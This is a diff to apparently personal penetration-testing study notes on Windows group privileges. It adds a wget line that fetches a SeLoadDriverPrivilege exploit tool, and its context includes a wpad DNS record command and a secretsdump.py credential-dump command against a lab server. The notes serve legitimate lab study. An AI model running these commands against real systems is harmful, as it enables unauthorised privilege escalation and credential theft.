@@ -59,6 +59,9 @@ Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerN
 - deleting virtual machine attempts to restore original file permissions on corresponding .vhdx file 
 ## Print Operators
 - Grants SeLoadDriverPrivilege, which is ability to to administer/connect/disconnect printers as well as login to domain controller
+```
+ wget https://github.com/JoshMorrison99/SeLoadDriverPrivilege #transfer to windows system 
+```
 
 
 ##  Server Operators 
@@ -91,7 +94,7 @@ net localgroup Administrators
 ```
 
 - AppReadiness is misconfigured to allow Server Operators full control and let them change how a service starts 
--  ONly possible if someon has service_all_access
+-  Only possible if someon has service_all_access
 **Data Exfilitration**
 ```bash
 secretsdump.py server_adm@10.129.43.42
